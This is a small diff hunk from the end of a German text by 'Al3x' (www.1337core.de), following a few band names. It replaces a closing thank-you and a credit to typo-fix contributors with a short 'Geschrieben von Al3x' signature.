@@ -3271,11 +3258,7 @@ NSync.
 Rammstein.
 Apache 207.
 
-Vielen Dank für deine Aufmerksamkeit.
-
-Vielen Dank für Hinweise auf Tippfehler und Verbesserungen an Noxmiles, DanielBilanovic, unbelauscht und ytvwld.
-
-Al3x
+Geschrieben von Al3x
 www.1337core.de
 
 
